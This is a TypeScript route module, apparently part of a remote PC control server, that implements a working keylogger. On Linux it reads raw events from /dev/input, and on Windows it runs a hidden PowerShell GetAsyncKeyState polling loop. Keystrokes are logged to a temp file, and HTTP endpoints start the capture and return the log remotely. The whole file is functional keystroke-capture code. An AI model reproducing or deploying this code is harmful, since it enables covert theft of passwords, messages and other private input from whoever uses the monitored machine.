import { Hono } from "hono";
import { spawn, type ChildProcess } from "node:child_process";
import { createReadStream, existsSync } from "node:fs";
import { appendFile, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

const app = new Hono();

let keylogProcess: ChildProcess | null = null;
const logFile = join(tmpdir(), "remote-pc-keylog.txt");

// Linux key code to key name mapping
const KEY_NAMES: Record<number, string> = {
  1: "ESC",
  2: "1",
  3: "2",
  4: "3",
  5: "4",
  6: "5",
  7: "6",
  8: "7",
  9: "8",
  10: "9",
  11: "0",
  12: "-",
  13: "=",
  14: "BACKSPACE",
  15: "TAB",
  16: "q",
  17: "w",
  18: "e",
  19: "r",
  20: "t",
  21: "y",
  22: "u",
  23: "i",
  24: "o",
  25: "p",
  26: "[",
  27: "]",
  28: "ENTER",
  29: "L_CTRL",
  30: "a",
  31: "s",
  32: "d",
  33: "f",
  34: "g",
  35: "h",
  36: "j",
  37: "k",
  38: "l",
  39: ";",
  40: "'",
  41: "`",
  42: "L_SHIFT",
  43: "\\",
  44: "z",
  45: "x",
  46: "c",
  47: "v",
  48: "b",
  49: "n",
  50: "m",
  51: ",",
  52: ".",
  53: "/",
  54: "R_SHIFT",
  56: "L_ALT",
  57: "SPACE",
  58: "CAPS_LOCK",
  59: "F1",
  60: "F2",
  61: "F3",
  62: "F4",
  63: "F5",
  64: "F6",
  65: "F7",
  66: "F8",
  67: "F9",
  68: "F10",
  87: "F11",
  88: "F12",
  96: "KP_ENTER",
  97: "R_CTRL",
  100: "R_ALT",
  102: "HOME",
  103: "UP",
  104: "PGUP",
  105: "LEFT",
  106: "RIGHT",
  107: "END",
  108: "DOWN",
  109: "PGDN",
  110: "INSERT",
  111: "DELETE",
  125: "SUPER",
};

// List available input devices
app.get("/devices", async (c) => {
  try {
    if (process.platform === "linux") {
      const { readdir } = await import("node:fs/promises");
      const devices: string[] = [];

      try {
        const byId = await readdir("/dev/input/by-id/");
        devices.push(
          ...byId
            .filter((d) => d.includes("kbd"))
            .map((d) => "/dev/input/by-id/" + d),
        );
      } catch {
        // Fallback: list event devices
        const inputDir = await readdir("/dev/input/");
        devices.push(
          ...inputDir
            .filter((d) => d.startsWith("event"))
            .map((d) => "/dev/input/" + d),
        );
      }

      return c.json({ success: true, devices });
    }

    return c.json({ success: true, devices: ["default"] });
  } catch (error: any) {
    return c.json({ success: false, error: error.message }, 500);
  }
});

// Start keylogger
app.post("/start", async (c) => {
  if (keylogProcess) {
    return c.json({ success: false, error: "Keylogger is already running" });
  }

  try {
    const { device } = await c.req.json().catch(() => ({ device: "" }));
    await writeFile(logFile, "");

    if (process.platform === "linux") {
      const devicePath = device || "/dev/input/event0";

      // Validate device path - must be under /dev/input/
      if (!devicePath.startsWith("/dev/input/")) {
        return c.json({ success: false, error: "Invalid device path" }, 400);
      }

      // Read raw input events from the device
      const stream = createReadStream(devicePath);
      const EVENT_SIZE = 24; // sizeof(struct input_event) on 64-bit

      let buffer = Buffer.alloc(0);

      stream.on("data", async (chunk) => {
        buffer = Buffer.concat([buffer, chunk as Buffer]);

        while (buffer.length >= EVENT_SIZE) {
          const type = buffer.readUInt16LE(16);
          const code = buffer.readUInt16LE(18);
          const value = buffer.readInt32LE(20);
          buffer = buffer.subarray(EVENT_SIZE);

          // type 1 = EV_KEY, value 1 = key press
          if (type === 1 && value === 1) {
            const keyName = KEY_NAMES[code] || `KEY_${code}`;
            const timestamp = new Date().toISOString();
            await appendFile(logFile, `[${timestamp}] ${keyName}\n`).catch(
              () => {},
            );
          }
        }
      });

      // Store the stream reference for cleanup
      keylogProcess = stream as any;
      keylogProcess!.kill = () => {
        stream.close();
        return true;
      };
    } else if (process.platform === "win32") {
      // Windows: use PowerShell to capture keystrokes
      keylogProcess = spawn(
        "powershell",
        [
          "-Command",
          `
        $logPath = '${logFile}'
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class KeyLogger {
          [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        }
"@
        while($true) {
          for($i=8; $i -le 190; $i++) {
            if([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
              $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i)
              $ts = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
              Add-Content -Path $logPath -Value "[$ts] $key"
            }
          }
          Start-Sleep -Milliseconds 10
        }
        `,
        ],
        { stdio: "ignore" },
      );
    }

    return c.json({ success: true, message: "Keylogger started" });
  } catch (error: any) {
    keylogProcess = null;
    return c.json({ success: false, error: error.message }, 500);
  }
});

// Stop keylogger
app.post("/stop", async (c) => {
  if (!keylogProcess) {
    return c.json({ success: false, error: "Keylogger is not running" });
  }

  try {
    keylogProcess.kill();
    keylogProcess = null;
    return c.json({ success: true, message: "Keylogger stopped" });
  } catch (error: any) {
    keylogProcess = null;
    return c.json({ success: false, error: error.message }, 500);
  }
});

// Get keylogger status
app.get("/status", (c) => {
  return c.json({ success: true, running: keylogProcess !== null });
});

// Get captured keystrokes
app.get("/log", async (c) => {
  try {
    if (!existsSync(logFile)) {
      return c.json({ success: true, log: "" });
    }
    const content = await readFile(logFile, "utf-8");
    return c.json({ success: true, log: content });
  } catch (error: any) {
    return c.json({ success: false, error: error.message }, 500);
  }
});

// Clear keylog
app.post("/clear", async (c) => {
  try {
    await writeFile(logFile, "");
    return c.json({ success: true, message: "Log cleared" });
  } catch (error: any) {
    return c.json({ success: false, error: error.message }, 500);
  }
});

export { app as keyloggerRoutes };
